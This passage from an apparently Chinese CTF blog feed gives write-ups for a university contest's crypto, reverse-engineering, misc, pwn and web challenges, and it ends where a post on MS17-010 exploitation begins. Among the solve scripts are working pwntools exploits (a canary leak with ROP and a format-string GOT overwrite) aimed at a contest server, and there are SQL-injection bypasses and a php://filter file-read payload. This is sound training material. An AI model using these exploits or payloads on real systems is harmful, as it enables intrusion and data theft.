        s.append(res + &quot;0&quot;)
    print (&quot;&quot;.join(s)[:-1])
encode(flag)
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://7usai.github.io/post-images/1601204975990.png" alt="" loading="lazy"></figure>
<p>硬算，算到一半发现加法就行，淦</p>
<h4 id="脚本-2">脚本</h4>
<pre><code>a=[2,20,12,19,2,19,5,58,24,46,52,30,32,49,36,30,17,40,38,39,51,60]
b=[67,85,77,84,67,84,70,123,89,111,117,95,97,114,101,95,82,105,103,104,116,125]
flag=''
for i in range(22):
    flag+=chr(b[i])
    print(flag)
</code></pre>
<p>a=上边一坨-1</p>
<p>b=a+65</p>
<p>得flag=CUMTCTF{You_are_Right}</p>
<h3 id="初中生的密码题">初中生的密码题</h3>
<figure data-type="image" tabindex="2"><img src="https://7usai.github.io/post-images/1601205029628.png" alt="" loading="lazy"></figure>
<p>先用z3求出来p和q的值，最后正常计算鸡号</p>
<h4 id="脚本-3">脚本</h4>
<pre><code>from z3 import *
n=848636981711330203910533960833570455347986345690792054016750216327432282027653737545502731789145875082064910377585125307004316982829408169391535303284775605083341204318559328114199464933306718077358184455649201353500348066849356092072732731595459583112558025395897556853371526959018489282157258240657926428930442774978485014507505784476690845099227369478496626645851076679385883251594929952035661085961598388544126711902983065521128172978259778754970695037278639045266353840536697343675638366506183715240679610094431082173271579344392346412454309134164388560354168918421706979410826758333952277436780339926907679282601846125790204266958409253210507301575619878252146515542791259716201124558373197816421305046774535734189567481599690381428371580696486054135486182509762880877363356256116336930055483318415453999460475103494980748558993889459677374574910745242385711928489669790527969454801533682757508950065697410745338257289717598141031203566419840587221470340637486034911686587695890702753064441476917845870069997649577034149354150224132983093069444866234262542625997399303875938451386377357399819123134018307163799151847997740448433278364764592560369020005024859119937315831252233159882960532854116233641920659786799836075681746397
x =-3052070064538177039316204197190587772604720575847063904632214287646067455053231054471310322671549035272267675314294983896730810628462303176753740499536650509067032550999649642312183001467325569057721784454105443122299599368088210370664912463545058026638059476152117310712548608873763578306375998350729040793659145108802752313856984121444358377361896069243965149432626400631035486457915394853541729904150184876824863707417199152978276518660302136096681722191666079256269268999389217644896376343059852127338281844120448782198891495913902938174313438531667749920307775936355947018946620720978288405012504885451732231636
#x=p-q
c=500276652165476232076654622771677157250768179732264713523579845370773246348163260024607736441521224561215622461281586014983237858652417057155657449969056265720660829190301384970568346350223955618393888481761163081860577739642188925549367659640679318096760942544021237730989148483458109811329253634447727676739448614959129278184402908867775906054394989855924225114919908155555192049492166217426223547541734881640953812554490770886539711015590595225643347250775256347202731382399075874986175633735843442294362952658782222039304359012268388983517266514673942584394340271959108268767970975584914229361774953712985148623666397952697929068249614923619593159697025023419729477175132378161714469266964087936259094268257305699373043845836862837431528242266637009047435391814783091218052253028403118436883809360635254672757916796698717205444912499939444332318464917599147934380674170566512663319563482316813585703326406255062594138402301545958040346473049702846530817878290456916073719516628914765617094899424596847550000272048391510943841604964078978359922836810502915050553112186304778654077116518976860791033948994210848441625200565771078991918078367509133628707097275095964646533882786598320142068378456597291213602688733329815247771873609
p=Int('p')
solve((p-x)*p==n)
q=Int('q')
solve((q+x)*q==n)
import gmpy2
from Crypto.Util.number import long_to_bytes
n=848636981711330203910533960833570455347986345690792054016750216327432282027653737545502731789145875082064910377585125307004316982829408169391535303284775605083341204318559328114199464933306718077358184455649201353500348066849356092072732731595459583112558025395897556853371526959018489282157258240657926428930442774978485014507505784476690845099227369478496626645851076679385883251594929952035661085961598388544126711902983065521128172978259778754970695037278639045266353840536697343675638366506183715240679610094431082173271579344392346412454309134164388560354168918421706979410826758333952277436780339926907679282601846125790204266958409253210507301575619878252146515542791259716201124558373197816421305046774535734189567481599690381428371580696486054135486182509762880877363356256116336930055483318415453999460475103494980748558993889459677374574910745242385711928489669790527969454801533682757508950065697410745338257289717598141031203566419840587221470340637486034911686587695890702753064441476917845870069997649577034149354150224132983093069444866234262542625997399303875938451386377357399819123134018307163799151847997740448433278364764592560369020005024859119937315831252233159882960532854116233641920659786799836075681746397
x =-3052070064538177039316204197190587772604720575847063904632214287646067455053231054471310322671549035272267675314294983896730810628462303176753740499536650509067032550999649642312183001467325569057721784454105443122299599368088210370664912463545058026638059476152117310712548608873763578306375998350729040793659145108802752313856984121444358377361896069243965149432626400631035486457915394853541729904150184876824863707417199152978276518660302136096681722191666079256269268999389217644896376343059852127338281844120448782198891495913902938174313438531667749920307775936355947018946620720978288405012504885451732231636
c=500276652165476232076654622771677157250768179732264713523579845370773246348163260024607736441521224561215622461281586014983237858652417057155657449969056265720660829190301384970568346350223955618393888481761163081860577739642188925549367659640679318096760942544021237730989148483458109811329253634447727676739448614959129278184402908867775906054394989855924225114919908155555192049492166217426223547541734881640953812554490770886539711015590595225643347250775256347202731382399075874986175633735843442294362952658782222039304359012268388983517266514673942584394340271959108268767970975584914229361774953712985148623666397952697929068249614923619593159697025023419729477175132378161714469266964087936259094268257305699373043845836862837431528242266637009047435391814783091218052253028403118436883809360635254672757916796698717205444912499939444332318464917599147934380674170566512663319563482316813585703326406255062594138402301545958040346473049702846530817878290456916073719516628914765617094899424596847550000272048391510943841604964078978359922836810502915050553112186304778654077116518976860791033948994210848441625200565771078991918078367509133628707097275095964646533882786598320142068378456597291213602688733329815247771873609
e=65537
p=30697352531330434856674588715905741896538207322123455679076478093195252240812032665803037835289865152784098077605359655486723575203621508201904205626825328632340569805064205047909749046701590344754257018324448436810374908046833801210988143008924043901109029730458966709669708451252061195235570558910738154083634093497318083877286614306923427160713075752860556509004687350746768578465885884145482528431003386829431965250868646361821676571510726939416897822283852421262616728229663652002544064443613737966055339522820176866519596663623744466631149567795708311336148219848210798881176646765091102193180034355210912558857
q=27645282466792257817358384518715154123933486746276391774444263805549184785758801611331727512618316117511830402291064671589992764575159205025150465127288678123273537254064555405597566045234264775696535233870342993688075308678745590840323230545378985874470970254306849398957159842378297616929194560560009113289974948388515331563429630185479068783351179683616591359572060950115733092007970489291940798526853201952607101543451447208843400052850424803320216100092186342006347459230274434357647688100553885838717057678699728084320705167709841528456836129264040561415840443911854851862230026044112813788167529469759180327221
phi=(p-1)*(q-1)
d=gmpy2.invert(e,phi)
m=pow(c,d,n)
print (long_to_bytes(m))
</code></pre>
<h3 id="维也纳的秘密">维也纳的秘密</h3>
<p>wieners'attack</p>
<h4 id="脚本-4">脚本</h4>
<pre><code>e=25917869905353789552020051839685545807585887908450046088427531244499827291976782167954270910349135145650576577205887579602980345558674985105395501978268901326322190984756245598741821138929832796245200282809945902092452927735584403680358445261613953914943536843526277769116394598364429894016586950531738412000187564890144398840990145571955885937892052001539698596307058524682284055181201743515900813100220071848907331770786412369754343096043812458135104781836976573362623373912743876433806153076511149098647316326372142332490513102220713378272264003312902390898505790604790827479508911958178382856897907933377199566193
n=106602285831498822487486788497175055483413389274589435452182276717168915909703214196853831977107354376432175898907138060839801174230414399787961943308337842404599650916026415088762884858533403685998642441889119464243033004157478415547348866271362374758519029622126260984221580425672553497959526120398333794097492072777294689861833216730806226598330023420842069978222331772053519086812747673926909582663647038444661450353860411353335396908135442649692949063384865189330930012072526189754891675689042899811272336626668598113507084941522892240083044217780510968538395593221822537870102185136371596420208737931264071089819
c=15398020641711885710559511139367125697390856767570980918702304069921551026824973830905965011884029877409200714436395451238518167931282498171004159255219750106440201159997510300464170737146936143635060376097700682667493454396974135053233282346399826911102207173673203896533100043044490481712129066709761310607999156923718443531985800620856745964481756350778958018672069263974407939095582178915567712702600480364745442553319386928686249421339611325002839784705114574454557275960371558688802008912473101758827685572398618014465630145531065781435184623872800843020069614302900368019005227544170327166191217204578975950160
import gmpy2
from Crypto.Util.number import long_to_bytes


def transform(x, y):  # 使用辗转相处将分数 x/y 转为连分数的形式
    res = []
    while y:
        res.append(x // y)
        x, y = y, x % y
    return res


def continued_fraction(sub_res):
    numerator, denominator = 1, 0
    for i in sub_res[::-1]:  # 从sublist的后面往前循环
        denominator, numerator = numerator, i * numerator + denominator
    return denominator, numerator  # 得到渐进分数的分母和分子，并返回


# 求解每个渐进分数
def sub_fraction(x, y):
    res = transform(x, y)
    res = list(map(continued_fraction, (res[0:i] for i in range(1, len(res)))))  # 将连分数的结果逐一截取以求渐进分数
    return res


def get_pq(a, b, c):  # 由p+q和pq的值通过维达定理来求解p和q
    par = gmpy2.isqrt(b * b - 4 * a * c)  # 由上述可得，开根号一定是整数，因为有解
    x1, x2 = (-b + par) // (2 * a), (-b - par) // (2 * a)
    return x1, x2


def wienerAttack(e, n):
    for (d, k) in sub_fraction(e, n):  # 用一个for循环来注意试探e/n的连续函数的渐进分数，直到找到一个满足条件的渐进分数
        if k == 0:  # 可能会出现连分数的第一个为0的情况，排除
            continue
        if (e * d - 1) % k != 0:  # ed=1 (mod φ(n)) 因此如果找到了d的话，(ed-1)会整除φ(n),也就是存在k使得(e*d-1)//k=φ(n)
            continue

        phi = (e * d - 1) // k  # 这个结果就是 φ(n)
        px, qy = get_pq(1, n - phi + 1, n)
        if px * qy == n:
            p, q = abs(int(px)), abs(int(qy))  # 可能会得到两个负数，负负得正未尝不会出现
            d = gmpy2.invert(e, (p - 1) * (q - 1))  # 求ed=1 (mod  φ(n))的结果，也就是e关于 φ(n)的乘法逆元d
            return d
    print(&quot;该方法不适用&quot;)
d=wienerAttack(e,n)
print(&quot;d=&quot;,d)
key=pow(c, d, n)
print(key)
key1=long_to_bytes(key)
print(key1)
</code></pre>
<h3 id="我只吃素">我只吃素</h3>
<h4 id="脚本-5">脚本</h4>
<pre><code>from Crypto.Util.number import long_to_bytes
s=open('F:/markdown/Typora/SAVES/校赛题目/20200923/Crypto/我只吃素.txt','r').read()
b = [3,5,7,11,13,17,19,23,29,31]
for i in b:
    s=int(s,i)
    s=hex(s)[2:]
    s=bytes.fromhex(s).decode()
dic={}
for i in range(10):
    dic[chr(ord('0')+i)]=i
for i in range(26):
    dic[chr(ord('a') + i)] = i+10
for i in range(26):
    dic[chr(ord('A') + i)] = i+10+26
print(dic)

def change(s, k):
    j=0
    res=0
    for i in range(len(s)):
        res += dic[s[len(s) - i - 1]] * pow(k, j)
        j+=1
    return res
c = [37, 41, 43, 47, 53, 59, 61]
for j in c:
    s=change(s,j)
    s=hex(s)[2:]
    c=s
    s = bytes.fromhex(s).decode()
ss=int(c,16)
print(long_to_bytes(ss))
print(s)
</code></pre>
<h2 id="re">RE</h2>
<h3 id="re1">re1</h3>
<figure data-type="image" tabindex="3"><img src="https://7usai.github.io/post-images/1601205060940.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="4"><img src="https://7usai.github.io/post-images/1601205069100.png" alt="" loading="lazy"></figure>
<h3 id="re2">re2</h3>
<figure data-type="image" tabindex="5"><img src="https://7usai.github.io/post-images/1601205077620.png" alt="" loading="lazy"></figure>
<p>脱壳机脱壳</p>
<figure data-type="image" tabindex="6"><img src="https://7usai.github.io/post-images/1601205085576.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="7"><img src="https://7usai.github.io/post-images/1601205093318.png" alt="" loading="lazy"></figure>
<h3 id="re3">re3</h3>
<p>从python字节码可看出是存入一个数组cipher，再与19异或得flag</p>
<h4 id="脚本-6">脚本</h4>
<pre><code>cipher=[80,70,94,71,80,71,85,104,86,39,64,106,76,67,
   106,71,123,92,125,76,37,106,103,118,80,35,119,32,110]
b=''
for i in range(29):
    b+=chr(cipher[i]^19)
    print(b)
</code></pre>
<h3 id="re4">re4</h3>
<p>无壳，32位</p>
<p>加密函数</p>
<figure data-type="image" tabindex="8"><img src="https://7usai.github.io/post-images/1601205154701.png" alt="" loading="lazy"></figure>
<p>存在v15的字符</p>
<figure data-type="image" tabindex="9"><img src="https://7usai.github.io/post-images/1601205183970.png" alt="" loading="lazy"></figure>
<p>正向脚本</p>
<pre><code>v15=[0x15,0x02,0x0A,0x16,0x13,0x0B,0x11,0x08,0x03,0x1B,0x19,0x21,0x12,0x1A,
     0x18,0x10,0x09,0x22,0x24,0x17,0x04,0x0E,0x0C,0x14,0x1E,0x00,0x1D,0x07,
     0x01,0x06,0x1F,0x0F,0x05,0x1C,0x0D,0x23,0x20,0x25]
a='eMl1_l1hT9_ldcoR3OC1CW0HhC_{UF30Tp__l}'
b=''
for j in range(len(v15)):
    b+=a[v15[j]]
    print(b)
</code></pre>
<p>其实a=flag[v15[j]]</p>
<p>逆向脚本不会写</p>
<figure data-type="image" tabindex="10"><img src="https://7usai.github.io/post-images/1601205194993.png" alt="" loading="lazy"></figure>
<p>再排序</p>
<figure data-type="image" tabindex="11"><img src="https://7usai.github.io/post-images/1601205201637.png" alt="" loading="lazy"></figure>
<h2 id="misc">Misc</h2>
<h3 id="连签到都算不上">连签到都算不上</h3>
<figure data-type="image" tabindex="12"><img src="https://7usai.github.io/post-images/1601205220371.png" alt="" loading="lazy"></figure>
<p>得</p>
<pre><code>\u81ea\u7531\u548c\u8c10\u5e73\u7b49\u5e73\u7b49\u81ea\u7531\u8bda\u4fe1\u548c\u8c10\u5e73\u7b49\u81ea\u7531\u81ea\u7531\u548c\u8c10\u5e73\u7b49\u81ea\u7531\u81ea\u7531\u516c\u6b63\u6cd5\u6cbb\u53cb\u5584\u5e73\u7b49\u5e73\u7b49\u6cd5\u6cbb\u548c\u8c10\u548c\u8c10\u516c\u6b63\u8bda\u4fe1\u6587\u660e\u516c\u6b63\u548c\u8c10\u548c\u8c10\u5bcc\u5f3a\u516c\u6b63\u8bda\u4fe1\u548c\u8c10\u548c\u8c10\u548c\u8c10\u5e73\u7b49\u8bda\u4fe1\u5e73\u7b49\u548c\u8c10\u6587\u660e\u5e73\u7b49\u8bda\u4fe1\u5e73\u7b49\u81ea\u7531\u548c\u8c10\u5e73\u7b49\u81ea\u7531\u81ea\u7531\u516c\u6b63\u6587\u660e\u6c11\u4e3b\u6cd5\u6cbb\u8bda\u4fe1\u548c\u8c10\u000d\u000a
</code></pre>
<p>继续转</p>
<figure data-type="image" tabindex="13"><img src="https://7usai.github.io/post-images/1601205241220.png" alt="" loading="lazy"></figure>
<p>继续转</p>
<figure data-type="image" tabindex="14"><img src="https://7usai.github.io/post-images/1601205251698.png" alt="" loading="lazy"></figure>
<h3 id="真签到题">真签到题</h3>
<figure data-type="image" tabindex="15"><img src="https://7usai.github.io/post-images/1601205294999.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="16"><img src="https://7usai.github.io/post-images/1601205311610.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="17"><img src="https://7usai.github.io/post-images/1601205326113.png" alt="" loading="lazy"></figure>
<h3 id="大鲨鱼之你可劲找">大鲨鱼之你可劲找</h3>
<p>这题真的很恶心<br>
<img src="https://7usai.github.io/post-images/1601205336893.png" alt="" loading="lazy"></p>
<p>先搜索flag，发现全是http</p>
<p>再缩小范围</p>
<figure data-type="image" tabindex="18"><img src="https://7usai.github.io/post-images/1601205347454.png" alt="" loading="lazy"></figure>
<p>这里可以看到是这样的sql语句</p>
<figure data-type="image" tabindex="19"><img src="https://7usai.github.io/post-images/1601205357377.png" alt="" loading="lazy"></figure>
<p>追踪http流</p>
<figure data-type="image" tabindex="20"><img src="https://7usai.github.io/post-images/1601205365585.png" alt="" loading="lazy"></figure>
<p>分为好几组，每一组确定一个十进制数，一组有好几段，每段后面都有一串字符，根据不同的字符判断是&gt;还是&lt;=，数就完事了，</p>
<figure data-type="image" tabindex="21"><img src="https://7usai.github.io/post-images/1601205375301.png" alt="" loading="lazy"></figure>
<h4 id="脚本-7">脚本</h4>
<pre><code>a=[99,101,99,99,49,51,57,52,45,54,49,51,51,45,52,51,
100,48,45,98,101,48,54,45,97,52,49,99,53,102,50,51,49,100,100,52,125]
b=''
for i in range(len(a)):
    b+=chr(a[i])
    print(b)
</code></pre>
<h3 id="别做题了听歌吧">别做题了听歌吧</h3>
<figure data-type="image" tabindex="22"><img src="https://7usai.github.io/post-images/1601205385896.jpg" alt="" loading="lazy"></figure>
<p>用MP3stego分离</p>
<figure data-type="image" tabindex="23"><img src="https://7usai.github.io/post-images/1601205396602.png" alt="" loading="lazy"></figure>
<p>得到这个</p>
<figure data-type="image" tabindex="24"><img src="https://7usai.github.io/post-images/1601205404190.png" alt="" loading="lazy"></figure>
<p>放入010editor</p>
<figure data-type="image" tabindex="25"><img src="https://7usai.github.io/post-images/1601205410895.png" alt="" loading="lazy"></figure>
<p>09为-，20为.，0D0A为\转化摩斯密码</p>
<figure data-type="image" tabindex="26"><img src="https://7usai.github.io/post-images/1601205417668.jpg" alt="" loading="lazy"></figure>
<h3 id="兔兔那么可爱">兔兔那么可爱</h3>
<p>以txt方式打开flag文件</p>
<figure data-type="image" tabindex="27"><img src="https://7usai.github.io/post-images/1601205424847.png" alt="" loading="lazy"></figure>
<p>斐波那契数列</p>
<h4 id="脚本-8">脚本</h4>
<pre><code>filename=&quot;C://Users/lenovo/Desktop/Misc3/flag.txt&quot;
fp=open(filename,&quot;r&quot;)
content=fp.read()
fp.close()
nterms = int(input(&quot;你需要几项？&quot;))
n1 = 0
n2 = 1
count = 2
if nterms &lt;= 0:
    print(&quot;请输入一个正整数。&quot;)
elif nterms == 1:
    print(&quot;斐波那契数列：&quot;)
    print(n1)
else:
    print(&quot;斐波那契数列：&quot;)
    print(n1, &quot;,&quot;, n2, end=&quot; , &quot;)
    while count &lt; nterms:
        nth = n1 + n2
        print(nth, end=&quot; , &quot;)
        print(content[nth-1])
        n1 = n2
        n2 = nth
        count += 1
</code></pre>
<p>得flag</p>
<h2 id="pwn">pwn</h2>
<h3 id="test_nc">test_nc</h3>
<p>nc一下加qq要flag</p>
<figure data-type="image" tabindex="28"><img src="https://7usai.github.io/post-images/1601205435175.png" alt="" loading="lazy"></figure>
<h3 id="babystack">babystack</h3>
<p>当输入为1_love_y0u时拿到shell</p>
<h3 id="canary">canary</h3>
<figure data-type="image" tabindex="29"><img src="https://7usai.github.io/post-images/1601205443639.png" alt="" loading="lazy"></figure>
<p>buf在rsp+10，v3在rsp+48，两个相距0x38，输入‘a’*0x38，泄露出来canary的值，但是要减去换行符0xa，再通过ROPgadget找到sh的地址，构造payload。</p>
<pre><code>#!/usr/bin/env python2
#-*- coding:utf-8 -*
from pwn import *
context(arch='amd64',os='linux',log_level='debug')
r=remote('202.119.201.197',10004)
elf=ELF('./canary')
sys=0x4005F0
sh_addr=0x0400904
ret_rdi=0x00000000004008e3
r.recvuntil(&quot;Let's pwn it!&quot;)
payload='a'*0x38
r.sendline(payload)
r.recvuntil('a'*0x38)
canary=r.recv(8)
canary=canary.ljust(8,'\x00')
canary=u64(canary)-0xa
log.info(&quot;canary:&quot;+hex(canary))
payload=&quot;\x90&quot;*0x38+p64(canary)+&quot;\x90&quot;*0x8+p64(sh_addr)+p64(sys)
r.sendline(payload)
r.recv()
r.interactive()
</code></pre>
<h3 id="fmstr">fmstr</h3>
<figure data-type="image" tabindex="30"><img src="https://7usai.github.io/post-images/1601205452797.png" alt="" loading="lazy"></figure>
<p>Gets（）不限制输入，printf处有格式化字符串漏洞，可以从中泄露出输入的偏移，然后用fmstr_payload()把puts的got表中的内容改为backdoor的地址</p>
<pre><code>#!/usr/bin/env python2
#-*- coding:utf-8 -*
from pwn import *
from LibcSearcher import *
r=remote('202.119.201.197',10006)
elf=ELF('./fmstr')
sys=0x0804857D
puts_got=elf.got['puts']
payload=fmtstr_payload(8,{puts_got:sys})
r.sendline(payload)
r.interactive()
</code></pre>
<h3 id="babyrop">babyrop</h3>
<figure data-type="image" tabindex="31"><img src="https://7usai.github.io/post-images/1601205468718.png" alt="" loading="lazy"></figure>
<p>buf实际在ebp-6c，但却要输入0x100，存在溢出，并没有在发现system（），但发现可以通过泄露write的got表的内容得到write的实际地址，然后通过泄露出的地址的后三位查找libc的版本</p>
<h2 id="web">web</h2>
<h3 id="web签到">web签到</h3>
<p>步骤</p>
<figure data-type="image" tabindex="32"><img src="https://7usai.github.io/post-images/1601205478240.png" alt="" loading="lazy"></figure>
<p>打开发现需要GET传参但并未指明参数，多次尝试发现只需要传入?1即可；</p>
<figure data-type="image" tabindex="33"><img src="https://7usai.github.io/post-images/1601205485110.png" alt="" loading="lazy"></figure>
<ol>
<li>传入发现需要post一个2，多次尝试发现并没有反应，于是使用burpsuite</li>
</ol>
<figure data-type="image" tabindex="34"><img src="https://7usai.github.io/post-images/1601205494381.png" alt="" loading="lazy"></figure>
<p>在params里填好参数后发现2后面多了一个等号，然后就传参成功，并且发现php代码；</p>
<figure data-type="image" tabindex="35"><img src="https://7usai.github.io/post-images/1601205503388.png" alt="" loading="lazy"></figure>
<p>明显是使用PHP伪协议查看源文件即可获得flag</p>
<figure data-type="image" tabindex="36"><img src="https://7usai.github.io/post-images/1601205511353.png" alt="" loading="lazy"></figure>
<p>base64解码即可</p>
<figure data-type="image" tabindex="37"><img src="https://7usai.github.io/post-images/1601205520780.png" alt="" loading="lazy"></figure>
<h3 id="babysqli">Babysqli</h3>
<p>使用burpsuite进行注入后发现空格被过滤了，使用/**/ 替代空格；</p>
<figure data-type="image" tabindex="38"><img src="https://7usai.github.io/post-images/1601205528504.png" alt="" loading="lazy"></figure>
<p>并且发现下方注释，猜测flag可能在password里面，使用SQL语句查询</p>
<figure data-type="image" tabindex="39"><img src="https://7usai.github.io/post-images/1601205537338.png" alt="" loading="lazy"></figure>
<p>发现flag，成功</p>
<h3 id="secret">Secret</h3>
<p>发现图片，并且下载图片，按文本格式打开，后发现php代码</p>
<figure data-type="image" tabindex="40"><img src="https://7usai.github.io/post-images/1601205544688.png" alt="" loading="lazy"></figure>
<p>进行代码审计，题目要求需要使用GET方式提交param1和param2,然后使用POST方式提交param1与 param2;file_get_contents(<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>s</mi><mi>t</mi><mi>r</mi><mn>1</mn><mo>)</mo><mi mathvariant="normal">是</mi><mi mathvariant="normal">指</mi><mi mathvariant="normal">需</mi><mi mathvariant="normal">要</mi><mi>s</mi><mi>t</mi><mi>r</mi><mn>1</mn><mi mathvariant="normal">以</mi><mi mathvariant="normal">文</mi><mi mathvariant="normal">件</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">形</mi><mi mathvariant="normal">式</mi><mi mathvariant="normal">写</mi><mi mathvariant="normal">入</mi><mi mathvariant="normal">值</mi><mi mathvariant="normal">，</mi><mi>i</mi><msub><mi>s</mi><mi>n</mi></msub><mi>u</mi><mi>m</mi><mi>e</mi><mi>r</mi><mi>i</mi><mi>c</mi><mo>(</mo></mrow><annotation encoding="application/x-tex">str1)是指需要str1以文件的形式写入值，is_numeric(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord">1</span><span class="mclose">)</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">指</span><span class="mord cjk_fallback">需</span><span class="mord cjk_fallback">要</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord">1</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">文</span><span class="mord cjk_fallback">件</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">形</span><span class="mord cjk_fallback">式</span><span class="mord cjk_fallback">写</span><span class="mord cjk_fallback">入</span><span class="mord cjk_fallback">值</span><span class="mord cjk_fallback">，</span><span class="mord mathdefault">i</span><span class="mord"><span class="mord mathdefault">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">u</span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">i</span><span class="mord mathdefault">c</span><span class="mopen">(</span></span></span></span>str2)是判断str2是否为数字并且可以识别十进制和十六进制，str2需要等于2592000，sleep()函数是要程序沉睡一段时间，if(((string)<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>s</mi><mi>t</mi><mi>r</mi><mn>1</mn><mo>!</mo><mo>=</mo><mo>=</mo><mo>(</mo><mi>s</mi><mi>t</mi><mi>r</mi><mi>i</mi><mi>n</mi><mi>g</mi><mo>)</mo></mrow><annotation encoding="application/x-tex">str1!==(string)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord">1</span><span class="mclose">!</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mclose">)</span></span></span></span>str2)&amp;&amp;(sha1(<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>s</mi><mi>t</mi><mi>r</mi><mn>1</mn><mo>)</mo><mo>=</mo><mo>=</mo><mo>=</mo><mi>s</mi><mi>h</mi><mi>a</mi><mn>1</mn><mo>(</mo></mrow><annotation encoding="application/x-tex">str1)===sha1(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">h</span><span class="mord mathdefault">a</span><span class="mord">1</span><span class="mopen">(</span></span></span></span>str2)))是指需要让str1与str2的字符串形式不同，并且经过sha1()后相同；绕过这些限制救可获得flag；</p>
<figure data-type="image" tabindex="41"><img src="https://7usai.github.io/post-images/1601205552672.png" alt="" loading="lazy"></figure>
<blockquote>
<p>使用十六进制绕过sleep()函数；</p>
<p>使用data://text/plain;base64,U3V2aW5fd2FudHNfYV9naXJsZnJpZW5k向str2中写入内容</p>
<p>关于sha1()函数的绕过，网上查找到文章https://www.addon.pub/2017/10/13/CTF-sha1%E5%92%8CMD5/</p>
</blockquote>
<h3 id="babysqli2">Babysqli2</h3>
<p>按照传统试一试平常的注入语句，之后发现过滤了单引号，网上查询可使用斜杠转义前面的单引号；</p>
<figure data-type="image" tabindex="42"><img src="https://7usai.github.io/post-images/1601205565567.png" alt="" loading="lazy"></figure>
<p>绕过成功，但是只显示了登录成功信息，猜测多半是盲注；发现substr() mid() 等函数被过滤了，但是left()仍可以使用；</p>
<p>由于flag的开头为C 所以就尝试猜测flag在password中的位置<img src="https://7usai.github.io/post-images/1601205573480.png" alt="" loading="lazy"></p>
<p>结果发现flag在第九行；之后便使用笨办法对flag进行逐个字母爆破，下方即为最终爆破结果，按照ascii码表转换为字母即可格式为		CUMTCTF{}，大括号内全为小写；</p>
<figure data-type="image" tabindex="43"><img src="https://7usai.github.io/post-images/1601205580981.png" alt="" loading="lazy"></figure>
<h3 id="简单文件包含">简单文件包含</h3>
<p>页面提示需要只支持本地请求，使用burpsuite，X-Forwarded-For：127.0.0.1 没有反应  然后尝试使用client-ip:127.0.0.1  成功；</p>
<figure data-type="image" tabindex="44"><img src="https://7usai.github.io/post-images/1601205588605.png" alt="" loading="lazy"></figure>
<p>发现使用了include_once()函数，并且使用了两次，该函数只能包含同一文件一次，继续网上查找方法；发现一个重复require_once()的函数的文章，是使用伪协议配合多级符号链接的办法进行绕过的；</p>
<pre><code>php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php
</code></pre>
<figure data-type="image" tabindex="45"><img src="https://7usai.github.io/post-images/1601205595546.png" alt="" loading="lazy"></figure>
<p>base64解码即可</p>
<figure data-type="image" tabindex="46"><img src="https://7usai.github.io/post-images/1601205601495.png" alt="" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[ms17-010漏洞利用]]></title>
        <id>https://7usai.github.io/post/9s2K54U7q/</id>
        <link href="https://7usai.github.io/post/9s2K54U7q/">
        </link>
        <updated>2020-09-20T08:16:24.000Z</updated>
        <content type="html"><![CDATA[<p>安装win7虚拟机</p>
<p>开启win7 445端口</p>
<figure data-type="image" tabindex="1"><img src="https://7usai.github.io/post-images/1600589823167.png" alt="" loading="lazy"></figure>
<p><img src="https://7usai.github.io/post-images/1600589829978.png" alt="" loading="lazy"><br>
